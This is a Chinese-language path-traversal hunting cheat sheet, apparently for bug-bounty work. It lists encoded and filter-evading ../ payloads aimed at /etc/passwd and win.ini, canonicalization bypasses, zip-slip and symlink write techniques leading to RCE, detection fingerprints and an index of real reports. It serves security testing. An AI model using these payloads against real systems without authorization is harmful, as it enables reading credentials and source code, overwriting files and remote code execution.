# hunt-path-traversal · 参考

按入口类型定向查阅。真实报告源自本仓库第二轮高价值案例（value_score≥8）。

## 编码 / 绕过族（Bypasses）

### A. 朴素与 URL 编码
```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd            # 编码斜杠
%2e%2e%2f%2e%2e%2f                     # 编码点+斜杠（#1353103）
..%252f..%252f                          # 双重编码（前端解一次，后端再解）
%c0%ae%c0%ae/  ..%c0%af                # 非法 UTF-8 覆盖过滤器
```

### B. 过滤器规避（针对"去掉 ../"的天真过滤）
```
....//....//        ..././..././        # 去一次 ../ 后仍剩 ../
..;/  ..%00/  ../\  ..\/                # 分号/空字节/混合分隔
/%2e%2e/                                 # 前置绝对
```

### C. Windows 专项
```
..\..\..\windows\win.ini
\??\C:\...   \\?\   GLOBALROOT\...       # DOS 设备/UNC（#812969 SMB smuggling）
..%5c..%5c                               # 编码反斜杠
```

### D. 截断 / 后缀绕过
- `?` 截断后缀：`page=web.xml?`（#413193，绕扩展名限制 + 泄露源码/凭据）。
- fragment `#` 干扰路径规范化（curl URL API，#726117）。
- 空字节 `%00` 截断（老栈）。

### E. 规范化 / canonical 差异 ★
校验用一种规范化、访问用另一种：
- `/data/user/0/...` 替代 `/data/data/...` 绕前缀检查（Android，#1408692）。
- `stringByStandardizingPath` 解析差异（macOS 安装器符号链接，#485407）。
- Rack 嵌套查询 `[file]` 字段名解析差异绕 `allowed_paths`，经 `/proc/PID/fd` 读任意文件（#850447）。
- Node.js 权限模型下路径未规范化（→ 也见 hunt-nodejs-permission-bypass，#2225660）。
- Uint8Array 存路径绕类型化路径检查（Node 20，#2256167）。
- `pushState` 用 `/../` 绕 admin 前缀（#662083）。

### F. 写 / 删（解压 / 上传 / 缓存 / 日志）★直达 RCE
- **zip-slip**：压缩包内含 `../../app/App.php`，解压覆盖 → 访问触发 RCE（#765291）。
- **tar transform + symlink**：`yarn install` 解包 transform 改绝对路径 + 符号链接任意写（#730239）。
- **nupkg 路径遍历 + 竞态**写文件（#822262）。
- **CI cache key `../`** 跨项目读/投毒缓存 → RCE（#301432）。
- **文件名冲突自动重命名**导致遍历（WebDAV，#258084）。
- **日志写入重定向 + NTFS 符号链接**任意文件创建（Steam，#682774）。
- **CSRF + `%2e%2e%2f`** 删任意文件（#1353103）。

## Detection Patterns（怎么判，而非猜）

- **内容指纹**：读到 `root:x:0:0`（/etc/passwd）、`[extensions]`（win.ini）、源码/`web.xml` 内容 = 命中。
- **差异对照**：`file=valid` vs `file=../../../etc/passwd`，响应长度/状态/内容不同。
- **写入痕迹**：解压/上传后，授权内标记路径出现你写的标记文件 = 越权写。
- **路径报错**：报错里回显了拼接后的绝对路径（`No such file /var/www/../../etc/...`）= 拼接点确认，即使没读成。
- **多层编码**：单层不中就试双重编码，命中说明前后端各解一次。

## Real Reports（复现索引）

| 族 | 报告 | 要点 |
|---|---|---|
| 编码斜杠+CSRF | 1353103 | `%2e%2e%2f` 删文件 |
| ? 截断 | 413193 | `web.xml?` 泄源码凭据 |
| Windows/SMB | 812969 / 726117 | `\??\`/fragment |
| canonical 差异 | 1408692 / 485407 / 850447 | `/data/user/0/`/符号链接/`/proc/fd` |
| Node 类型/规范化 | 2256167 / 2225660 | Uint8Array / path.resolve |
| zip-slip/tar | 765291 / 730239 / 822262 | 解压覆盖→RCE |
| CI cache | 301432 | cache key `../` 投毒 |
| 写重定向 | 682774 | 日志+NTFS 符号链接 |

hunt 顺序：读类入口先 A→B→E（编码/规范化），命中读 `/etc/passwd` 或源码；上传/解压入口直接 F（zip-slip/symlink），写标记文件验证。
